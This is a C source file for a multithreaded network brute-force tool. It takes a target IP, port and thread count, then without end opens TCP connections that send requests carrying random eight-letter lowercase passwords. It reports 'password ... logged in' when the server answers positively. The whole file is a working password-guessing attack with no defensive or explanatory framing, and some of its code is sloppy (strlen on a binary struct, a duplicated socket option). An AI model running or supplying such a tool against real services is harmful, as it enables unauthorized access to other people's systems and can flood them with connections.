#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

int sizeread;
char *tgtip;
struct timeval tv;
struct sockaddr_in sa;
int port;

struct request {
 int id;
 int typ;
 char body[8];
 char end[1];
}packed; 

char *make_req() {
 memset(&packed, 0, sizeof(packed));
 char *req = malloc(sizeof(packed));
 packed.id = rand() % (0xff - 0x01) + 0x01;
 packed.typ = 3;
 for(int i = 0; i < 8; i++) {
  packed.body[i] = rand() % (0x7b - 0x61) + 0x61;
 }
 packed.end[0] = 0;
 memcpy(req, &packed, sizeof(packed));
 return req;
}

int makesa() {
 sa.sin_addr.s_addr = inet_addr(tgtip);
 sa.sin_port = htons(port); 
 sa.sin_family = AF_INET;
}

void *dosg(void *unused) {
 char resp[1];
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 char *req = make_req();
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  write(fd, req, strlen(req)); 
  read(fd, resp, 1);
  if(resp[0] > 0) {
   dprintf(1, "password %s logged in\n", packed.body);
   exit(0);
  }
 }
 free(req);
 resp[0] = 0;
 close(fd);
}

int make_threads(int threadnum) {
 pthread_t threadg[threadnum];
 pthread_t threadp[threadnum]; 
 makesa();
 while(1) {
  for(int i = 0; i < threadnum; i++) {
   pthread_create(&threadg[i], 0, &dosg, 0);
  }
  for(int i = 0; i < threadnum; i++) {
   pthread_join(threadg[i], 0);
  }
 } 
}

int main(int argc, char **argv) {
 tv.tv_sec = 1;
 srand(time(0));
 if(argc < 4) {
  dprintf(1, "ip port threads\n");
  return 0;
 }
 tgtip = argv[1];
 port = atoi(argv[2]);
 make_threads(atoi(argv[3]));
}
